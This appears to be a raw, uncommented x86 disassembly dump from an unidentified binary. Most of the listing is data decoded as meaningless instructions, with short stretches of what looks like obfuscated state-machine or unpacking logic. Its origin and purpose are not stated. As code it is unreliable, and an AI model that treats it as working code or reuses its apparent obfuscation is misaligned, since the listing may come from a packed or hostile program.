  408b0d:	mov    es,WORD PTR [ebp-0x781d5fbf]
  408b13:	(bad)  
  408b14:	into   
  408b15:	dec    eax
  408b16:	sbb    eax,0xa87db6bb
  408b1b:	out    dx,al
  408b1c:	in     al,dx
  408b1d:	or     al,0x46
  408b1f:	adc    eax,0x8320fd2
  408b24:	push   esp
  408b25:	scas   eax,DWORD PTR es:[edi]
  408b26:	mov    ecx,0x61e8b66b
  408b2b:	stos   BYTE PTR es:[edi],al
  408b2c:	cwde   
  408b2d:	or     al,0xd0
  408b2f:	and    edx,esi
  408b31:	sbb    al,0xd0
  408b33:	and    eax,0xad8a4e9e
  408b38:	push   ecx
  408b39:	jg     0x408b97
  408b3b:	imul   esi,DWORD PTR [ecx-0x12],0x6b
  408b3f:	xchg   ebp,eax
  408b40:	jbe    0x408b47
  408b42:	mov    esp,0x99dbaab7
  408b47:	fcmovnu st,st(2)
  408b49:	je     0x408b6a
  408b4b:	shr    BYTE PTR [esi],0x53
  408b4e:	mov    dh,0x1a
  408b50:	jns    0x408b2a
  408b52:	sbb    bl,BYTE PTR [eax-0x45]
  408b55:	mov    al,0x58
  408b57:	rcr    BYTE PTR [ebx+eiz*4+0x2e],1
  408b5b:	push   esi
  408b5c:	fadd   st(4),st
  408b5e:	inc    esp
  408b5f:	test   al,0x76
  408b61:	push   ebp
  408b62:	rcl    DWORD PTR [esi],cl
  408b64:	xchg   esp,edx
  408b66:	xchg   ecx,eax
  408b67:	xlat   BYTE PTR ds:[ebx]
  408b68:	lods   al,BYTE PTR ds:[esi]
  408b69:	mov    DWORD PTR [esi+0x62],esp
  408b6c:	test   DWORD PTR [ecx],ebx
  408b6e:	test   BYTE PTR [edi],ah
  408b70:	mov    eax,0x8ba27ebe
  408b75:	xchg   ebx,eax
  408b76:	stos   BYTE PTR es:[edi],al
  408b77:	repnz inc esp
  408b79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b7a:	pop    ss
  408b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b7c:	fmul   DWORD PTR [esi+0x31]
  408b7f:	or     BYTE PTR [eax],dl
  408b81:	lea    ecx,[edx]
  408b83:	cmp    eax,edi
  408b85:	ret    
  408b86:	repz bound dx,DWORD PTR [edi]
  408b8a:	adc    BYTE PTR [ebp-0x46f310fb],ch
  408b90:	xor    eax,0xd9d16df4
  408b95:	inc    ecx
  408b96:	xchg   edx,eax
  408b97:	dec    esp
  408b98:	cli    
  408b99:	add    BYTE PTR [eax],cl
  408b9b:	jg     0x408ba3
  408b9d:	fmul   QWORD PTR [ebp-0x4d8b5aa1]
  408ba3:	shr    BYTE PTR [ecx],cl
  408ba5:	cmp    bl,cl
  408ba7:	xchg   edx,eax
  408ba8:	mov    bl,0x8d
  408baa:	scas   eax,DWORD PTR es:[edi]
  408bab:	shl    BYTE PTR [edx-0x3e],0x27
  408baf:	fistp  QWORD PTR [eax-0xe]
  408bb2:	push   0x32
  408bb4:	dec    esp
  408bb5:	push   0x23
  408bb7:	or     al,0xaf
  408bb9:	mov    al,0xc6
  408bbb:	test   al,0x3e
  408bbd:	aad    0xae
  408bbf:	scas   eax,DWORD PTR es:[edi]
  408bc0:	in     al,0x47
  408bc2:	test   eax,esp
  408bc4:	inc    ecx
  408bc5:	pop    ebx
  408bc6:	inc    ecx
  408bc7:	dec    edx
  408bc8:	jmp    0x420c5d7e
  408bcd:	sbb    al,0xda
  408bcf:	cmp    dl,BYTE PTR ds:0xc3133dd4
  408bd5:	inc    ecx
  408bd6:	sbb    eax,0x63fe5a62
  408bdb:	dec    esi
  408bdc:	mov    edx,ds
  408bde:	jbe    0x408c57
  408be0:	lods   eax,DWORD PTR ds:[esi]
  408be1:	jns    0x408bad
  408be3:	imul   ecx,DWORD PTR [eax-0x4265b37f],0xcc35ee54
  408bed:	dec    edx
  408bee:	or     ebp,0xffffffa3
  408bf1:	mov    ds,WORD PTR [ebp-0x3b]
  408bf4:	(bad)  
  408bf5:	les    edx,FWORD PTR [edi]
  408bf7:	std    
  408bf8:	mov    ds:0x2917a0b3,al
  408bfd:	(bad)  
  408bfe:	(bad)  
  408bff:	cmp    eax,DWORD PTR [edi]
  408c01:	aad    0x7e
  408c03:	das    
  408c04:	adc    eax,0x42a01793
  408c09:	pop    ecx
  408c0a:	pusha  
  408c0b:	stos   BYTE PTR es:[edi],al
  408c0c:	mov    ebp,DWORD PTR [ecx+0x15994bfa]
  408c12:	dec    ecx
  408c13:	std    
  408c14:	or     DWORD PTR [edx+edx*1],edi
  408c17:	fstp   TBYTE PTR [ebx+eax*1+0x49]
  408c1b:	jle    0x408c71
  408c1d:	out    0x50,eax
  408c1f:	mov    dh,0xdc
  408c21:	in     al,dx
  408c22:	rcr    BYTE PTR [ecx+0x1e],cl
  408c25:	mov    ah,0x54
  408c27:	mov    ecx,0xadad7500
  408c2c:	arpl   ax,ax
  408c2e:	sbb    ecx,DWORD PTR [ecx]
  408c30:	aas    
  408c31:	repz fcomp DWORD PTR [ecx-0x18]
  408c35:	hlt    
  408c36:	push   ss
  408c37:	mov    ecx,0x79e836b1
  408c3c:	(bad)  
  408c3e:	sbb    BYTE PTR [ecx-0x36c727e5],dl
  408c44:	rcl    BYTE PTR [ebx],1
  408c46:	or     eax,0xe9bc2645
  408c4b:	imul   ebx,edi,0x57
  408c4e:	push   ss
  408c4f:	and    BYTE PTR [ecx],ah
  408c51:	jne    0x408c98
  408c57:	mov    eax,ds:0x41497e
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x4345c3,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434587,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x4345b7,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x4344ef,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x4345ff,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x434577,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	adc    DWORD PTR [esi-0x1abbff6d],eax
  408ccf:	jle    0x408d4f
  408cd1:	loope  0x408d4b
  408cd3:	jle    0x408d53
  408cd5:	and    BYTE PTR [ebx+0xe12d885],0x26
  408cdc:	nop
  408cdd:	adc    DWORD PTR [esi-0x4d],esp
  408ce0:	jmp    0xba83:0xd8561066
  408ce7:	sub    eax,0x511088
  408cec:	popf   
  408ced:	pop    ss
  408cee:	ins    DWORD PTR es:[edi],dx
  408cef:	mov    ds:0x931f5b4,al
  408cf4:	lods   eax,DWORD PTR ds:[esi]
  408cf5:	cwde   
  408cf6:	add    eax,0xe9a073b5
  408cfb:	xor    edi,DWORD PTR [ecx-0x3b37c994]
  408d01:	sbb    ch,BYTE PTR [ebx-0x51]
  408d04:	adc    al,0x23
  408d06:	push   ecx
  408d07:	cmp    eax,0x9c9d4cef
  408d0c:	mov    edi,DWORD PTR [ebx]
  408d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d0f:	mov    dl,0xe6
  408d11:	dec    edx
  408d12:	cdq    
  408d13:	xor    ebp,DWORD PTR [ecx+0x67]
  408d16:	aas    
  408d17:	data16 cmp BYTE PTR [ecx+0x8],bh
  408d1b:	xor    bh,BYTE PTR [ebx-0xca5bcf2]
  408d21:	xor    edx,DWORD PTR [edi-0x3ca07e17]
  408d27:	push   esp
  408d28:	js     0x408d76
  408d2a:	ret    0xaa46
  408d2d:	mov    al,ds:0xa867c847
  408d32:	add    al,0x4c
  408d34:	sbb    edx,DWORD PTR [edx-0x6]
  408d37:	aam    0xaa
  408d39:	mov    ch,0x81
  408d3b:	ffreep st(0)
  408d3d:	inc    esi
  408d3e:	pop    ebx
  408d3f:	inc    ebp
  408d40:	sbb    al,0x31
  408d42:	xchg   edi,eax
  408d43:	push   ss
  408d44:	jl     0x408d91
  408d46:	shl    DWORD PTR [ebp+0x71fb25c6],0xd1
  408d4d:	jmp    0x408d58
  408d4f:	jecxz  0x408dc4
  408d51:	repz fisub DWORD PTR [ebp+edx*4+0x66f1fbe7]
  408d59:	retf   
  408d5a:	sbb    al,0x13
  408d5c:	or     ebx,DWORD PTR [esp+esi*4-0x75]
  408d60:	mov    bh,al
  408d62:	cli    
  408d63:	lahf   
  408d64:	fsub   QWORD PTR [edx+edi*4-0x58]
  408d68:	(bad)  
  408d6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d6b:	mov    dl,0xe2
  408d6d:	cwde   
  408d6e:	xor    dl,BYTE PTR [esp+edi*4]
  408d71:	js     0x408dea
  408d73:	or     eax,0xa40870df
  408d78:	fs or  al,0x5
  408d7b:	lahf   
  408d7c:	xchg   edx,eax
  408d7d:	sub    al,0xf0
  408d7f:	outs   dx,BYTE PTR ds:[esi]
  408d80:	add    BYTE PTR [edi],bh
  408d82:	jo     0x408d5f
  408d84:	stos   DWORD PTR es:[edi],eax
  408d85:	int3   
  408d86:	hlt    
  408d87:	adc    DWORD PTR [ecx],edx
  408d89:	mov    ah,0xe0
  408d8b:	add    BYTE PTR [ecx],al
  408d8d:	jge    0x408d18
  408d8f:	call   0x15a9e15d
  408d94:	push   edx
  408d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d96:	and    DWORD PTR [edx-0x77],edi
  408d99:	dec    edx
  408d9a:	sahf   
  408d9b:	sbb    BYTE PTR [ebx-0x17991b7a],ah
  408da1:	gs test dl,dl
  408da4:	pop    ebp
  408da5:	ret    
  408da6:	div    BYTE PTR [ebx]
  408da8:	popf   
  408da9:	loop   0x408d7c
  408dab:	or     dh,dh
  408dad:	stc    
  408dae:	popa   
  408daf:	mov    BYTE PTR [eax-0x607404a6],bh
  408db5:	int3   
  408db6:	and    esi,DWORD PTR [ecx+0x2766b23c]
  408dbc:	or     dh,BYTE PTR [esi+0x2a]
  408dbf:	or     esi,edx
  408dc1:	mov    dl,bl
  408dc3:	xchg   ebx,eax
  408dc4:	dec    eax
  408dc5:	inc    ecx
  408dc6:	cmp    esp,DWORD PTR [eax+esi*8+0x3]
  408dca:	cmp    DWORD PTR [ebx],esp
  408dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dcd:	data16 out dx,al
  408dcf:	stos   BYTE PTR es:[edi],al
  408dd0:	or     al,0x6c
  408dd2:	cmp    ch,BYTE PTR [esi]
  408dd4:	in     eax,dx
  408dd5:	fbld   TBYTE PTR [edx]
  408dd7:	ja     0x408d79
  408dd9:	sub    DWORD PTR [edx+0x26d1fa38],edx
  408ddf:	jecxz  0x408e10
  408de1:	imul   edi,DWORD PTR ds:0x43f413ee,0xffffffa2
  408de8:	retf   
  408de9:	jnp    0x408d83
  408deb:	sbb    ecx,esp
  408ded:	cwde   
  408dee:	out    dx,al
  408def:	xor    al,BYTE PTR [ebx-0x3f]
  408df2:	push   cs
  408df3:	xchg   esi,eax
  408df4:	scas   eax,DWORD PTR es:[edi]
  408df5:	sub    dh,BYTE PTR [eax]
  408df7:	mov    al,al
  408df9:	mov    ah,0x3e
  408dfb:	inc    ebx
  408dfc:	repnz inc edi
  408dfe:	jl     0x408daa
  408e00:	inc    ebx
  408e01:	popf   
  408e02:	or     al,0x79
  408e04:	cmp    ecx,DWORD PTR [eax]
  408e06:	test   esi,eax
  408e08:	push   ebx
  408e09:	adc    BYTE PTR [edi+edx*8-0x72],dh
  408e0d:	xlat   BYTE PTR ds:[ebx]
  408e0e:	les    edx,FWORD PTR [edx-0x4ce99e0f]
  408e14:	retf   0x6dad
  408e17:	dec    esi
  408e18:	pop    esp
  408e19:	mov    eax,0xfcb19609
  408e1e:	adc    eax,0xa8517834
  408e23:	jbe    0x408e93
  408e25:	pop    eax
  408e26:	mov    ah,0xe0
  408e28:	jg     0x408dce
  408e2a:	js     0x408e12
  408e2c:	icebp  
  408e2d:	dec    esi
  408e2e:	outs   dx,DWORD PTR ds:[esi]
  408e2f:	mov    esp,0x4fedd9a0
  408e34:	je     0x408e06
  408e36:	fcom   QWORD PTR [edi]
  408e38:	cmp    eax,0x69
  408e3b:	xchg   esp,eax
  408e3c:	loope  0x408dc6
  408e3e:	jo     0x408e39
  408e40:	pop    esp
  408e41:	lods   al,BYTE PTR ds:[esi]
  408e42:	xchg   BYTE PTR [eax-0x4c],bh
  408e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e46:	jae    0x408df4
  408e48:	cmc    
  408e49:	outs   dx,BYTE PTR ds:[esi]
  408e4a:	icebp  
  408e4b:	pmaxsw mm0,QWORD PTR [esi+ecx*1+0x4724e40f]
  408e53:	cli    
  408e54:	and    eax,0xb873f94a
  408e59:	or     al,0x7a
  408e5b:	pop    edx
  408e5c:	add    al,0xa7
  408e5e:	out    0x8e,eax
  408e60:	mov    dl,0x31
  408e62:	cmp    al,0xe
  408e64:	adc    edi,ebp
  408e66:	fisttp WORD PTR [eax]
  408e68:	(bad)  [ebp+0x2b3a9e6d]
  408e6e:	push   edi
  408e6f:	imul   ebp,DWORD PTR [eax-0x10],0x17
  408e73:	xor    DWORD PTR [edx+0x6a],0xfffffff8
  408e77:	sub    DWORD PTR [edx],edi
  408e79:	data16 add BYTE PTR [esi+0x69cb0101],0x15
  408e81:	fsubr  DWORD PTR [ebx+0x6ea9f2e5]
  408e87:	cmp    DWORD PTR [ebp+0x76ac88e1],edi
  408e8d:	fistp  QWORD PTR ds:0x12a49645
  408e93:	aad    0x7d
  408e95:	repz push ss
  408e97:	call   0x11d72284
  408e9c:	pop    ss
  408e9d:	xchg   BYTE PTR [eax-0x16],ch
  408ea0:	mov    edi,0x7ab7fa1b
  408ea5:	lods   al,BYTE PTR ds:[esi]
  408ea6:	inc    ebp
  408ea7:	cmp    BYTE PTR [esi+ebx*1],bl
  408eaa:	jbe    0x408e39
  408eac:	xchg   ebp,eax
  408ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eae:	scas   al,BYTE PTR es:[edi]
  408eaf:	mov    esi,0x1fa6be5a
  408eb4:	add    eax,0xc3ddb8ac
  408eb9:	ficom  WORD PTR [esp+esi*4+0xa939998]
  408ec0:	enter  0x5442,0xe0
  408ec4:	aam    0xe2
  408ec6:	push   edx
  408ec7:	dec    dx
  408ec9:	adc    eax,0x88019f4c
  408ece:	ficomp WORD PTR [edi+0x35]
  408ed1:	das    
  408ed2:	sbb    eax,0x8dbb3eed
  408ed7:	pusha  
  408ed8:	mov    esi,ebp
  408eda:	cmc    
  408edb:	ret    0xce77
  408ede:	add    edx,esi
  408ee0:	xor    eax,ebx
  408ee2:	add    eax,0xf718121a
  408ee7:	fsub   QWORD PTR [ecx+0x49022e11]
  408eed:	mov    BYTE PTR [eax+0x1a],0xea
  408ef1:	imul   esp,DWORD PTR [eax+0x1e1a1f37],0xfffffffe
  408ef8:	inc    edx
  408ef9:	inc    edx
  408efa:	mov    al,al
  408efc:	ss setg ah
  408f00:	push   edi
  408f01:	repnz repnz xchg ebp,eax
  408f04:	loop   0x408f5b
  408f06:	xchg   esp,eax
  408f07:	fldenv [ebx+esi*1+0x35]
  408f0b:	dec    ebp
  408f0c:	aas    
  408f0d:	mov    dh,0x3
  408f0f:	mov    cl,0x88
  408f11:	jno    0x408eb3
  408f13:	mov    esi,0xad49ccf8
  408f18:	add    cl,BYTE PTR [ebx+edi*4]
  408f1b:	xchg   ebx,eax
  408f1c:	data16 aam 0xf7
  408f1f:	sbb    ch,ch
  408f21:	lds    edi,FWORD PTR [ebp+0x32]
  408f24:	push   edx
  408f25:	fidivr WORD PTR [ecx-0x5419df6]
  408f2b:	mov    al,0x31
  408f2d:	mov    bh,0xfc
  408f2f:	sbb    eax,0xc22b122f
  408f34:	mov    BYTE PTR [esi-0x6d],dh
  408f37:	mov    ds:0xab17941e,eax
  408f3c:	mov    ch,0xb1
  408f3e:	ret    0x83fb
  408f41:	or     BYTE PTR gs:[eax],al
  408f44:	mov    eax,DWORD PTR [ebp-0x8]
  408f47:	or     DWORD PTR ds:0x4345c3,0x434583
  408f51:	sub    eax,DWORD PTR [ebp+0x8]
  408f54:	push   eax
  408f55:	mov    eax,ds:0x434603
  408f5a:	or     DWORD PTR ds:0x4345c3,eax
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x4344df,0x43454f
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x4345c7,0x434547
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x4344eb
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x4345b7,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x4344ff,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1-0x5d319a71]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x409043
  408fec:	cmp    dh,0x2e
  408fef:	adc    edi,DWORD PTR [ebx-0x37]
  408ff2:	fadd   QWORD PTR es:[edi+ebx*2-0x21]
  408ff7:	push   esp
  408ff8:	mov    al,ds:0xc1499bd2
  408ffd:	jbe    0x409019
  408fff:	lock test eax,0xca4cde78
  409005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409006:	xor    eax,0x1732f7a
  40900b:	push   0xd55a891e
  409010:	daa    
  409011:	icebp  
  409012:	inc    ecx
  409013:	jb     0x408fed
  409015:	into   
  409016:	mov    ecx,0x48ed4dcf
  40901b:	sbb    DWORD PTR [edx-0x5],ecx
  40901e:	cmp    DWORD PTR [esi],ecx
  409020:	inc    eax
  409021:	sub    al,0x4f
  409023:	mov    eax,0xa31135f0
  409028:	popf   
  409029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40902a:	push   esi
  40902b:	xchg   bh,dh
  40902d:	mov    ch,0x8f
  40902f:	jb     0x408ff2
  409031:	pop    edi
  409032:	fcmovnu st,st(4)
  409034:	and    DWORD PTR [ecx+0x51],ecx
  409037:	pop    eax
  409038:	fbstp  TBYTE PTR [edi-0x5a]
  40903b:	stc    
  40903c:	rcl    bh,0xcc
  40903f:	gs daa 
  409041:	mov    al,cl
  409043:	xchg   esp,eax
  409044:	jb     0x409036
  409046:	retf   0x2679
  409049:	iret   
  40904a:	jnp    0x409062
  40904c:	add    al,0x93
  40904e:	retf   
  40904f:	and    ecx,esp
  409051:	or     esp,ebx
  409053:	or     DWORD PTR [eax+0x5bdf1745],edi
  409059:	popf   
  40905a:	jmp    0x2046:0x1fb6a5ea
  409061:	int    0xa8
  409063:	icebp  
  409064:	gs dec edx
  409066:	aad    0x22
  409068:	sub    BYTE PTR [edi+0x7],ch
  40906b:	xor    bh,BYTE PTR [esi]
  40906d:	and    eax,0xdebe5d2c
  409072:	sub    DWORD PTR [ebx],0xc5da5404
  409078:	xchg   ebp,eax
  409079:	scas   al,BYTE PTR es:[edi]
  40907a:	(bad)  
  40907b:	cld    
  40907c:	jb     0x4090de
  40907e:	and    al,0x46
  409080:	fistp  DWORD PTR [ebx+0x1b253726]
  409086:	add    ebx,esp
  409088:	lea    eax,[eax]
  40908a:	shl    cl,0xc7
  40908d:	mov    dh,0x5e
  40908f:	mov    ?,WORD PTR [ebp+ebp*1+0x6a110c85]
  409096:	je     0x4090cc
  409098:	sub    al,0xa0
  40909a:	es mov ?,esp
  40909d:	imul   edi,DWORD PTR [edx],0x1ee95239
  4090a3:	sbb    BYTE PTR ds:0x84ad0e5b,dh
  4090a9:	in     eax,0x7c
  4090ab:	test   BYTE PTR [edi],bl
  4090ad:	arpl   WORD PTR [edx],si
  4090af:	cmp    esi,DWORD PTR [eax-0x41a112be]
  4090b5:	and    al,0x83
  4090b7:	sub    DWORD PTR [ebx],ebp
  4090b9:	inc    edx
  4090ba:	xor    al,0x19
  4090bc:	cmc    
  4090bd:	sbb    BYTE PTR [ebx+0x61],al
  4090c0:	mov    ecx,0x37c9474a
  4090c5:	adc    edx,DWORD PTR [ebx]
  4090c7:	cmp    DWORD PTR [edi-0x2f4e3c1],esi
  4090cd:	cmp    al,0xa
  4090cf:	xlat   BYTE PTR ds:[ebx]
  4090d0:	dec    edx
  4090d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090d2:	mov    dl,BYTE PTR [edx]
  4090d4:	xchg   ch,cl
  4090d6:	gs aaa 
  4090d8:	jne    0x409115
  4090da:	int3   
  4090db:	call   0x6360ebc0
  4090e0:	mov    ah,0xbd
  4090e2:	in     al,dx
  4090e3:	jno    0x40913d
  4090e5:	mov    dl,ch
  4090e7:	call   0x2a85:0x91b02fe0
  4090ee:	adc    BYTE PTR [ebp-0x1919f312],ch
  4090f4:	or     al,0x79
  4090f6:	push   0xd0a2ebc0
  4090fb:	out    dx,eax
  4090fc:	or     eax,0x274e153d
  409101:	shl    BYTE PTR [eax],cl
  409103:	aas    
  409104:	push   ebp
  409105:	lods   al,BYTE PTR ds:[esi]
  409106:	mov    ds:0x8c4303cc,al
  40910b:	or     bh,BYTE PTR [eax+0x42]
  40910e:	rcl    DWORD PTR [edx-0x7cbf6077],cl
  409114:	ins    DWORD PTR es:[edi],dx
  409115:	cmp    al,ah
  409117:	xchg   ecx,eax
  409118:	pop    esi
  409119:	inc    eax
  40911a:	mov    ds:0x4e75b1eb,al
  40911f:	push   0xffffffd2
  409121:	std    
  409122:	out    dx,eax
  409123:	pop    es
  409124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409125:	aaa    
  409126:	fcomp  QWORD PTR [eax-0x7a]
  409129:	push   ds
  40912a:	in     eax,dx
  40912b:	mov    cl,0x8c
  40912d:	jns    0x409128
  40912f:	ss clc 
  409131:	sub    BYTE PTR [edi+0x1a487e01],dl
  409137:	or     DWORD PTR [eax],eax
  409139:	pop    ebp
  40913a:	retf   
  40913b:	inc    edi
  40913c:	lea    esp,[eax+edi*4+0x4c]
  409140:	xor    al,0x3c
  409142:	(bad)  
  409143:	jb     0x4090c6
  409145:	inc    eax
  409146:	mov    BYTE PTR [edi+0x4],ah
  409149:	shl    DWORD PTR [ecx],1
  40914b:	adc    al,0x0
  40914d:	in     eax,0x9e
  40914f:	lock xacquire sub DWORD PTR [ebp-0x38],ebx
  409154:	fild   WORD PTR [ebx+0x59dd6172]
  40915a:	and    BYTE PTR [esi+0x61692c2],0x11
  409161:	aam    0x3a
  409163:	icebp  
  409164:	add    al,0x9c
  409166:	outs   dx,DWORD PTR ds:[esi]
  409167:	sbb    ecx,DWORD PTR [ebx-0x2d]
  40916a:	sub    DWORD PTR ds:0x4b689198,esi
  409170:	mov    ebp,0x91e2dad8
  409175:	aad    0x93
  409177:	pop    edi
  409178:	xor    al,0x3c
  40917a:	fistp  QWORD PTR [edi-0x1f]
  40917d:	call   0xaca8b60b
  409182:	retf   
  409183:	jp     0x409159
  409185:	(bad)  
  409186:	xchg   ecx,eax
  409187:	retf   0xb572
  40918a:	jno    0x40912f
  40918c:	push   ebx
  40918d:	cmp    BYTE PTR [esi],dh
  40918f:	push   ebx
  409190:	daa    
  409191:	enter  0x5b50,0x4b
  409195:	pop    ebx
  409196:	fnsave ds:0xa6964d0b
  40919c:	mov    al,BYTE PTR [esi-0xc]
  40919f:	push   ss
  4091a0:	scas   eax,DWORD PTR es:[edi]
  4091a1:	cmp    esi,DWORD PTR [esi-0x27]
  4091a4:	cs enter 0xc3fa,0x1
  4091a9:	jae    0x40921b
  4091ab:	and    cl,BYTE PTR [ecx]
  4091ad:	lea    eax,[ebp+ebx*8+0x3bf73e03]
  4091b4:	mov    esp,0x6ee80215
  4091b9:	ins    BYTE PTR es:[edi],dx
  4091ba:	rcr    edx,cl
  4091bc:	mov    bh,0x85
  4091be:	fstp   TBYTE PTR ds:0xb3420f18
  4091c4:	and    eax,DWORD PTR [ebx+0x1a]
  4091c7:	outs   dx,BYTE PTR ds:[esi]
  4091c8:	iret   
  4091c9:	push   ebp
  4091ca:	mov    ebp,0xecc8abbc
  4091cf:	add    esp,ebp
  4091d1:	popf   
  4091d2:	jmp    0x409223
  4091d4:	std    
  4091d5:	jbe    0x409177
  4091d7:	push   ebp
  4091d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091d9:	sbb    esi,0x66dc94da
  4091df:	mov    ds:0xc1119a85,al
  4091e4:	and    al,0xca
  4091e6:	xchg   edx,eax
  4091e7:	add    al,0xe9
  4091e9:	pushf  
  4091ea:	adc    ebx,DWORD PTR ss:[esi+edx*8+0x75]
  4091ef:	mov    al,0xc
  4091f1:	push   edx
  4091f2:	icebp  
  4091f3:	cmp    cl,dl
  4091f5:	inc    edx
  4091f6:	mov    ebx,0x4deb9e38
  4091fb:	mov    BYTE PTR [edx],dl
  4091fd:	(bad)  
  4091fe:	int    0x84
  409200:	aaa    
  409201:	or     eax,DWORD PTR [esi]
  409203:	sub    bl,BYTE PTR [ebp+0x1a]
  409206:	rol    DWORD PTR [esi+0x6],1
  409209:	jmp    0x7fe8eeb4
  40920e:	outs   dx,BYTE PTR ds:[esi]
  40920f:	cmp    eax,0x261dccc0
  409214:	retf   0x34c3
  409217:	fbld   TBYTE PTR [edx]
  409219:	xchg   ebx,eax
  40921a:	test   al,0x3c
  40921c:	(bad)  
  40921d:	add    DWORD PTR [esi-0x14],0xe39aea32
  409224:	int    0x5f
  409226:	addr16 push esp
  409228:	push   ss
  409229:	fistp  DWORD PTR [ecx+eiz*2+0x76eaa014]
  409230:	fsubp  st(3),st
  409232:	lds    esp,FWORD PTR [edi-0x9]
  409235:	or     dh,0xb6
  409238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409239:	ins    DWORD PTR es:[edi],dx
  40923a:	outs   dx,DWORD PTR ds:[esi]
  40923b:	or     DWORD PTR [ebp+0x57],eax
  40923e:	in     al,dx
  40923f:	test   al,0xc4
  409241:	mov    BYTE PTR [ebx-0x6f],al
  409244:	neg    ecx
  409246:	pop    esi
  409247:	pop    ecx
  409248:	js     0x40921a
  40924a:	cli    
  40924b:	shr    BYTE PTR [ebx],1
  40924d:	test   DWORD PTR [eax+0x7e],ebp
  409250:	push   ebp
  409251:	push   ss
  409252:	std    
  409253:	lods   al,BYTE PTR ds:[esi]
  409254:	repnz icebp 
  409256:	xor    eax,esi
  409258:	add    eax,ebx
  40925a:	mov    DWORD PTR [ebp-0x54],eax
  40925d:	lea    eax,[ebp-0x1c]
  409260:	mov    DWORD PTR [ebp-0x50],eax
  409263:	mov    eax,DWORD PTR [ebp-0x60]
  409266:	xor    eax,esi
  409268:	add    eax,ebx
  40926a:	mov    DWORD PTR [ebp-0x60],eax
  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x434537,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x43453b,0x5787
  409304:	jmp    0x40971b
